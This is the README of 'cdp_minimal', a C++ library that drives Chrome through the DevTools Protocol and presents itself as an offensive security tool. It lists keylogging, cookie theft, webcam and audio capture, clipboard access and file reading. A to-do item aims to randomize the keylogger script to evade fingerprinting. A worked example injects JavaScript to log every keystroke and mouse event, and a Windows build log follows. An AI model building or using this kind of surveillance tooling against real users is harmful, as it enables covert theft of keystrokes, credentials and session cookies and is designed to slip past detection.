# cdp_minimal
 A minimal no dependencies C++17/20 client library for the Chrome DevTools Protocol (CDP). Built for offensive security testing 

## Features
- Realtime Keylogging
- URL Tracking
- Redirection
- Web Cam Photos / List Web Cams
- Audio Capture / List audio devices
- Screenshotting
- Cookie Theft
- Global Clipboard Read/Write
- File Reading
- Browser Navigation

## To-do
- remove static strings
- randomize keylogger JS to avoid static fingerprints
- make thread safe

## Examples
### Input Tracking

```C++
#include <cdp/browser.h>
#include <iostream>
#include <cdp/input_event.h>

int main() {
    // Connect to a browser via host and port
    cdp::Browser browser("127.0.0.1", 9222);

    // actually connect to the browser.
    if (!browser.connect()) {
        std::cerr << "Failed to connect to browser." << std::endl;
        return 1;
    }

    // 1. Define the callback
    auto inputHandler = [](const cdp::InputEvent& ev) {
        std::visit([](auto&& arg) {
            using T = std::decay_t<decltype(arg)>;
            // if its a mouse event
            if constexpr (std::is_same_v<T, cdp::MouseEvent>) {
                std::cout << "Mouse at: " << arg.x << ", " << arg.y << std::endl;
            }
            // if its a keyboard event
            else if constexpr (std::is_same_v<T, cdp::KeyboardEvent>) {
                std::cout << "Key pressed: " << arg.key << std::endl;
            }
            }, ev);
        };


    // 2. Register the callback and store the ID
    auto callbackId = browser.addOnInput(inputHandler);

    // 3. Start watching for input
    // The watchInput method triggers the background thread and injects JS
    browser.watchInput();

    // Keep the application running to receive events
    std::cout << "Monitoring input... Press Enter to stop." << std::endl;
    std::cin.get();

    // 4. Cleanup
    browser.removeOnInput(callbackId);
    browser.stopInput();

    return 0;
}
```

<img width="1352" height="783" alt="inputTracking" src="https://github.com/user-attachments/assets/8030f1fb-4f40-4696-822b-0e98fcbe424b" />

 ### Building the test Binary 
You can build a test binary with the following cmake commands. 
 ```
PS C:\Users\drew\cdp_minimal> cmake -B build 
....

PS C:\Users\drew\cdp_minimal> cmake --build build --config Debug
MSBuild version 18.8.2+ce25c0108 for .NET Framework

  1>Checking Build System
  Building Custom Rule C:/Users/drew/cdp_minimal/CMakeLists.txt
  browser.cpp
  Please define _WIN32_WINNT or _WIN32_WINDOWS appropriately. For example:
  - add -D_WIN32_WINNT=0x0601 to the compiler command line; or
  - add _WIN32_WINNT=0x0601 to your project's Preprocessor Definitions.
  Assuming _WIN32_WINNT=0x0601 (i.e. Windows 7 target).
  page.cpp
  cookie.cpp
  result.cpp
  channel.cpp
  connection.cpp
  Please define _WIN32_WINNT or _WIN32_WINDOWS appropriately. For example:
  - add -D_WIN32_WINNT=0x0601 to the compiler command line; or
  - add _WIN32_WINNT=0x0601 to your project's Preprocessor Definitions.
  Assuming _WIN32_WINNT=0x0601 (i.e. Windows 7 target).
  Generating Code...
  cdp.vcxproj -> C:\Users\drew\cdp_minimal\build\Debug\cdp.lib
  Building Custom Rule C:/Users/drew/cdp_minimal/CMakeLists.txt
  main.cpp
  cdp_test.vcxproj -> C:\Users\drew\cdp_minimal\build\Debug\cdp_test.exe
  C:/Users/drew/cdp_minimal/build/Debug/cdp_test.exe: message: deploying dependencies
  Building Custom Rule C:/Users/drew/cdp_minimal/CMakeLists.txt
PS C:\Users\drew\cdp_minimal>
```
